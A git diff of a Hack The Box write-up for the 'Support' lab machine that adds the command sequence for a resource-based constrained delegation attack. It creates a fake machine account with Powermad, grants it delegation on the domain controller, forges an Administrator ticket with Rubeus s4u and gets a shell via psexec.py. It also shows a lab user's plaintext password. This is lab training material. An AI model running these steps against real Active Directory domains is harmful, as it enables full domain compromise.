@@ -1,4 +1,4 @@
-```
+![image](https://github.com/regarmulia/HTB/assets/33616880/e4ddfec3-a99b-4b8a-9b9b-590cd649863a)```
 nmap -sS -sC -sV -T5 -Pn 10.10.11.174
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/c513fb68-50d1-41b4-8934-27824a4ed58e)
@@ -62,7 +62,7 @@ evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
 
 ```
 Get-ADDomain
-echo '10.129.178.26 dc.support.htb' | sudo tee -a /etc/hosts
+echo '10.10.11.174 dc.support.htb' | sudo tee -a /etc/hosts
 whoami /groups
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/1f8391b0-f0b9-4bac-ac66-73d102f2e7df)
@@ -90,3 +90,38 @@ upload PowerView.ps1
 Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/3d6b600f-4598-4175-bd67-5112eda8a285)
+
+
+```
+git clone https://github.com/Kevin-Robertson/Powermad.git
+upload Powermad.ps1
+. ./Powermad.ps1
+New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
+Get-ADComputer -identity FAKE-COMP01
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/df2e4c56-b5f0-4166-8893-5f314a1ddd96)
+
+
+```
+Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
+Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
+Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/ef2757a0-de07-432e-9a48-9a27e403cc85)
+
+
+```
+upload Rubeus.exe
+.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
+58A478135A93AC3BF058A5EA0E8FDB71
+.\Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
+https://www.browserling.com/tools/remove-all-whitespace
+base64 -d ticket.kirbi.b64 > ticket.kirbi
+locate ticketConverter.py
+./ticketConverter.py ticket.kirbi ticket.ccache
+locate psexec.py
+KRB5CCNAME=ticket.ccache ./psexec.py support.htb/administrator@dc.support.htb -k -no-pass
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/c7d86351-2afa-4ba9-a89f-33e93dbd0ad5)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/ae871fd3-7dd0-4315-aac9-3859e1180ef7)
